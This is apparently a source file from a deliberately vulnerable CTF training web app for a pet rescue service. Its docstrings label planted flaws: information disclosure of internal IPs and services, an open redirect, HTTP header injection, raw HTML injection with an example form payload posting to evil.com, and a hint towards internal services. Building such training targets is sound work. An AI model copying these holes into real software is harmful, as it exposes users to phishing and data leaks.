"""
Misc Blueprint — Health, Redirect, HTML Injection, Share
Vulnerabilities: Info disclosure (#9), Open redirect (#23), HTML injection (#17),
HTTP header injection (#32)
"""
import sys
import platform
import socket
from datetime import datetime
from flask import Blueprint, request, jsonify, redirect, make_response, g, send_from_directory
from middleware.auth_middleware import require_auth
from utils.id_encoder import decode_id
from utils import database as db

misc_bp = Blueprint('misc', __name__)

_start_time = datetime.utcnow()


@misc_bp.route('/api/health', methods=['GET'])
def health_check():
    """
    VULN #9: Information disclosure — leaks server versions, internal IP, debug status, etc.
    """
    import flask
    return jsonify({
        'status': 'healthy',
        'application': 'PawsHaven API',
        'version': '2.4.1',
        'python_version': sys.version,
        'flask_version': flask.__version__,
        'debug_mode': True,
        'server_os': platform.platform(),
        'internal_ip': socket.gethostbyname(socket.gethostname()),
        'database': 'sqlite3 (per-user sandboxed)',
        'jwt_algorithm': 'HS256',
        'uptime': str(datetime.utcnow() - _start_time),
        'endpoints_count': 40,
        'active_services': {
            'vet_records': 'http://127.0.0.1:8080',
            'billing': 'http://127.0.0.1:9090',
            'metadata': 'http://127.0.0.1:1337'
        }
    })


@misc_bp.route('/api/redirect', methods=['GET'])
def redirect_handler():
    """
    VULN #23: Open redirect — no validation on redirect target.
    VULN #32: HTTP header injection — ref param injected into response header.
    """
    url = request.args.get('url', '/')
    ref = request.args.get('ref', '')

    response = make_response('', 302)
    response.headers['Location'] = url  # Open redirect

    if ref:
        response.headers['X-Redirect-Ref'] = ref  # Header injection vector

    return response


from middleware.auth_middleware import optional_auth

@misc_bp.route('/api/share/<encoded_id>', methods=['GET'])
@optional_auth
def share_animal(encoded_id):
    """
    VULN #17: HTML injection — the 'note' parameter is injected raw into HTML response.
    Payload: <h1>HACKED</h1><form action="http://evil.com">...
    """
    note = request.args.get('note', 'Check out this adorable pet on PawsHaven!')
    res_type, res_id = decode_id(encoded_id)
    
    animal = None
    if g.sandbox_id and res_type == 'animal' and res_id is not None:
        try:
            animal = db.query_one(g.sandbox_id, "SELECT * FROM animals WHERE id = ?", [res_id])
        except Exception:
            pass

    # Build details block if animal found
    details_html = ""
    if animal:
        emoji = '🐕' if animal['species'] == 'Dog' else '🐈' if animal['species'] == 'Cat' else '🐾'
        details_html = f"""
        <div style="display:flex; gap: 15px; margin-bottom: 20px; align-items: center;">
            <div style="font-size: 4rem; background:#f0f0f0; border-radius: 12px; padding: 10px; width: 80px; text-align: center;">{emoji}</div>
            <div>
                <h3 style="margin: 0; color:#2d6a4f; font-size: 1.5rem;">{animal['name']}</h3>
                <p style="margin: 5px 0 0 0; font-size: 0.95rem;">{animal['breed']} • {animal['age']} • {animal['gender']}</p>
                <p style="margin: 5px 0 0 0; font-size: 0.9rem; font-style: italic;">{animal.get('description', '')[:100]}...</p>
            </div>
        </div>
        """

    # VULN: 'note' parameter injected raw into HTML
    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PawsHaven — Share</title>
<style>
body{{font-family:Nunito,sans-serif;background:#faf7f2;display:flex;justify-content:center;padding:40px;}}
.card{{background:#fff;border-radius:16px;padding:30px;max-width:500px;width:100%;box-shadow:0 10px 30px rgba(0,0,0,0.08)}}
.card h2{{color:#2d6a4f;margin-top:0;margin-bottom:20px; border-bottom: 2px solid #eef2f5; padding-bottom: 10px;}} 
.card p.note{{color:#333;line-height:1.6; background: #eef2f5; padding: 15px; border-radius: 8px; border-left: 4px solid #2d6a4f;}}
.cta{{display:block;text-align:center;background:#2d6a4f;color:white;padding:14px;border-radius:8px;text-decoration:none;margin-top:20px;font-weight:bold;transition:0.2s}}
.cta:hover{{background:#1b4332}}
</style>
</head>
<body>
<div class="card">
<h2>🐾 Shared from PawsHaven</h2>
{details_html}
<p class="note"><strong>Message:</strong><br>{note}</p>
<a class="cta" href="/animals/{encoded_id}">View {animal['name'] if animal else 'Animal'} on PawsHaven →</a>
</div>
</body>
</html>"""

    return html, 200, {'Content-Type': 'text/html; charset=utf-8'}


@misc_bp.route('/api/swagger', methods=['GET'])
def swagger_index():
    """
    Renders a realistic Swagger UI clone for PawsHaven API.
    """
    html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Swagger UI - PawsHaven API</title>
    <style>
        :root {
            --swagger-green: #49cc90;
            --swagger-blue: #61affe;
            --swagger-orange: #fca130;
            --swagger-red: #f93e3e;
            --swagger-bg: #fafafa;
            --text-main: #3b4151;
        }
        body { font-family: 'Open Sans', sans-serif; background: var(--swagger-bg); margin: 0; padding: 0; color: var(--text-main); }
        .topbar { background: #1b1b1b; padding: 10px 0; border-bottom: 3px solid var(--swagger-green); }
        .topbar .container { max-width: 1200px; margin: 0 auto; display: flex; align-items: center; padding: 0 20px; }
        .topbar h1 { color: var(--swagger-green); margin: 0; font-size: 24px; font-weight: bold; letter-spacing: -1px; }
        .topbar h1 span { color: #fff; font-weight: normal; }
        .explore { margin-left: auto; display: flex; gap: 10px; }
        .explore input { background: #fff; border: 1px solid #61affe; padding: 6px 10px; border-radius: 4px; width: 300px; font-size: 14px; }
        .explore button { background: var(--swagger-blue); color: #fff; border: none; padding: 6px 15px; border-radius: 4px; font-weight: bold; cursor: pointer; }

        .container { max-width: 1200px; margin: 0 auto; padding: 40px 20px; }
        .info { margin-bottom: 40px; }
        .info h2 { font-size: 36px; margin: 0 0 10px; display: flex; align-items: center; gap: 10px; }
        .info .version { background: #7d8492; color: #fff; font-size: 12px; padding: 4px 10px; border-radius: 20px; vertical-align: middle; }
        .info p { font-size: 16px; line-height: 1.6; max-width: 800px; }
        .info .base-url { font-family: monospace; background: #333; color: #fff; padding: 2px 6px; border-radius: 3px; font-size: 14px; }

        .download-box { display: flex; gap: 15px; margin-top: 20px; }
        .btn-dl { text-decoration: none; font-size: 13px; font-weight: bold; padding: 8px 16px; border-radius: 4px; color: #fff; display: inline-flex; align-items: center; gap: 8px; }
        .btn-yaml { background: var(--swagger-green); }
        .btn-postman { background: #ff6c37; }

        .tag-section { margin-top: 50px; }
        .tag-header { border-bottom: 1px solid rgba(59,65,81,0.2); padding-bottom: 10px; margin-bottom: 20px; display: flex; align-items: center; gap: 15px; }
        .tag-header h3 { margin: 0; font-size: 24px; }
        .tag-header .desc { color: #7d8492; font-size: 14px; }

        .op-block { border: 1px solid #000; border-radius: 4px; margin-bottom: 10px; overflow: hidden; background: #fff; }
        .op-block-get { border-color: var(--swagger-blue); background: rgba(97,175,254,0.1); }
        .op-block-post { border-color: var(--swagger-green); background: rgba(73,204,144,0.1); }
        .op-block-put { border-color: var(--swagger-orange); background: rgba(252,161,48,0.1); }
        .op-block-delete { border-color: var(--swagger-red); background: rgba(249,62,62,0.1); }

        .op-summary { padding: 10px 20px; display: flex; align-items: center; cursor: pointer; }
        .op-method { color: #fff; font-weight: bold; padding: 6px 15px; border-radius: 3px; font-size: 14px; width: 60px; text-align: center; margin-right: 15px; text-transform: uppercase; }
        .get .op-method { background: var(--swagger-blue); }
        .post .op-method { background: var(--swagger-green); }
        .put .op-method { background: var(--swagger-orange); }
        .delete .op-method { background: var(--swagger-red); }
        .op-path { font-family: monospace; font-weight: bold; font-size: 16px; color: #3b4151; flex: 1; }
        .op-desc { color: #3b4151; font-size: 14px; }

        .op-content { padding: 20px; border-top: 1px solid rgba(0,0,0,0.1); display: none; }
        .op-block.open .op-content { display: block; }

        .op-subtitle { font-weight: bold; margin-bottom: 10px; font-size: 14px; color: #3b4151; }
        table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }
        th { text-align: left; padding: 10px; font-size: 12px; color: #3b4151; border-bottom: 1px solid #3b4151; }
        td { padding: 10px; font-size: 13px; border-bottom: 1px solid rgba(59,65,81,0.1); }
        .param-name { font-weight: bold; font-family: monospace; }
        .param-type { color: #7d8492; font-style: italic; font-size: 12px; }

        .response-code { font-weight: bold; color: var(--swagger-green); }
        .example { background: #333; color: #fff; padding: 15px; border-radius: 4px; font-family: monospace; font-size: 12px; white-space: pre-wrap; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="topbar">
        <div class="container">
            <h1>{ } <span>swagger</span></h1>
            <div class="explore">
                <input type="text" value="/api/swagger/api.yaml">
                <button>Explore</button>
            </div>
        </div>
    </div>
    <div class="container">
        <div class="info">
            <h2>PawsHaven API <span class="version">2.4.1</span></h2>
            <p>Official API documentation for the PawsHaven Veterinary & Animal Rescue Platform. This specification covers all available endpoints for animal management, adoptions, and community features.</p>
            <p><strong>[ Base URL: <span class="base-url">/api</span> ]</strong></p>
            
            <div class="download-box">
                <a href="/api/swagger/api.yaml" class="btn-dl btn-yaml">📥 Download OpenAPI (YAML)</a>
                <a href="/api/swagger/API.json" class="btn-dl btn-postman">🚀 Download Postman Collection (JSON)</a>
            </div>
        </div>

        <!-- Section: Auth -->
        <div class="tag-section">
            <div class="tag-header">
                <h3>Auth</h3>
                <span class="desc">Authentication and session management</span>
            </div>
            
            <div class="op-block op-block-post post" onclick="this.classList.toggle('open')">
                <div class="op-summary">
                    <span class="op-method">post</span>
                    <span class="op-path">/auth/login</span>
                    <span class="op-desc">Authenticate user and start session</span>
                </div>
                <div class="op-content">
                    <div class="op-subtitle">Parameters</div>
                    <table>
                        <thead><tr><th>Name</th><th>Description</th></tr></thead>
                        <tbody>
                            <tr><td><span class="param-name">email</span> <br><span class="param-type">string (body)</span></td><td>User email address</td></tr>
                            <tr><td><span class="param-name">password</span> <br><span class="param-type">string (body)</span></td><td>User password</td></tr>
                        </tbody>
                    </table>
                    <div class="op-subtitle">Responses</div>
                    <div class="response-code">200 OK</div>
                    <div class="example">{ "message": "Login successful", "user": { ... } }</div>
                </div>
            </div>
        </div>

        <!-- Section: Animals -->
        <div class="tag-section">
            <div class="tag-header">
                <h3>Animals</h3>
                <span class="desc">Browse and manage rescue animals</span>
            </div>
            
            <div class="op-block op-block-get get" onclick="this.classList.toggle('open')">
                <div class="op-summary">
                    <span class="op-method">get</span>
                    <span class="op-path">/animals</span>
                    <span class="op-desc">List all adoptable animals</span>
                </div>
                <div class="op-content">
                    <div class="op-subtitle">Responses</div>
                    <div class="response-code">200 OK</div>
                    <div class="example">[ { "id": 1, "name": "Buddy", "species": "Dog", ... } ]</div>
                </div>
            </div>

            <div class="op-block op-block-post post" onclick="this.classList.toggle('open')">
                <div class="op-summary">
                    <span class="op-method">post</span>
                    <span class="op-path">/animals/{id}/adopt</span>
                    <span class="op-desc">Submit an adoption application</span>
                </div>
                <div class="op-content">
                    <div class="op-subtitle">Parameters</div>
                    <table>
                        <thead><tr><th>Name</th><th>Description</th></tr></thead>
                        <tbody>
                            <tr><td><span class="param-name">id</span> <br><span class="param-type">string (path)</span></td><td>Encoded animal ID</td></tr>
                            <tr><td><span class="param-name">reason</span> <br><span class="param-type">string (body)</span></td><td>Motivation for adoption</td></tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>

        <!-- Section: Admin -->
        <div class="tag-section">
            <div class="tag-header">
                <h3>Admin</h3>
                <span class="desc">Administrative controls and oversight</span>
            </div>
            
            <div class="op-block op-block-post post" onclick="this.classList.toggle('open')">
                <div class="op-summary">
                    <span class="op-method">post</span>
                    <span class="op-path">/admin/adoptions/{id}/respond</span>
                    <span class="op-desc">Approve or decline an adoption request</span>
                </div>
                <div class="op-content">
                    <div class="op-subtitle">Parameters</div>
                    <table>
                        <thead><tr><th>Name</th><th>Description</th></tr></thead>
                        <tbody>
                            <tr><td><span class="param-name">id</span> <br><span class="param-type">string (path)</span></td><td>Encoded adoption ID</td></tr>
                            <tr><td><span class="param-name">status</span> <br><span class="param-type">string (body)</span></td><td>Choice: "approved" or "declined"</td></tr>
                            <tr><td><span class="param-name">notes</span> <br><span class="param-type">string (body)</span></td><td>Feedback for the applicant</td></tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>

        <!-- Section: Internal (Hint for CTF) -->
        <div class="tag-section">
            <div class="tag-header">
                <h3>Internal</h3>
                <span class="desc">Internal microservices (Restricted)</span>
            </div>
            
            <div class="op-block op-block-get get" onclick="this.classList.toggle('open')">
                <div class="op-summary">
                    <span class="op-method">get</span>
                    <span class="op-path">/vet/records/{id}</span>
                    <span class="op-desc">Fetch full medical history from internal VetAPI</span>
                </div>
                <div class="op-content">
                    <p style="color: var(--swagger-red); font-weight: bold;">⚠️ Restricted to internal VPC calls only.</p>
                </div>
            </div>
        </div>

    </div>
</body>
</html>"""
    return html, 200, {'Content-Type': 'text/html'}


@misc_bp.route('/api/swagger/<filename>', methods=['GET'])
def download_docs(filename):
    """
    Serve API documentation files for Postman targeting /api/documentation
    """
    import os
    docs_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'docs')
    
    if filename in ['API.json', 'api.yaml']:
        file_path = os.path.join(docs_dir, filename)
        if os.path.exists(file_path):
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Dynamically replace the base_url with the current request host URL
            current_host = request.host_url.rstrip('/')
            hardcoded_url = "https://trivia-pub-about-investigation.trycloudflare.com"
            content = content.replace(hardcoded_url, current_host)
            
            response = make_response(content)
            response.headers['Content-Disposition'] = f'attachment; filename={filename}'
            response.headers['Content-Type'] = 'application/json' if filename.endswith('.json') else 'application/x-yaml'
            return response
    
@misc_bp.route('/api/broadcast/check', methods=['GET'])
@optional_auth
def check_broadcast():
    """Returns the latest global or private broadcast message."""
    import os
    import json
    from config import Config
    
    # 1. Check for Private Message first (High Priority)
    if g.sandbox_id:
        private_file = os.path.join(Config.SANDBOX_DIR, g.sandbox_id, 'message.json')
        if os.path.exists(private_file):
            try:
                with open(private_file, 'r') as f:
                    data = json.load(f)
                
                exp = data.get('expires_at')
                if exp and datetime.utcnow() > datetime.fromisoformat(exp):
                    os.remove(private_file)
                else:
                    return jsonify(data)
            except: pass

    # 2. Fallback to Global Broadcast
    broadcast_file = os.path.join(Config.BASE_DIR, 'data', 'global_broadcast.json')
    if os.path.exists(broadcast_file):
        try:
            with open(broadcast_file, 'r') as f:
                data = json.load(f)
            
            exp = data.get('expires_at')
            if exp and datetime.utcnow() > datetime.fromisoformat(exp):
                os.remove(broadcast_file)
            else:
                return jsonify(data)
        except: pass
    
    return jsonify({}), 204
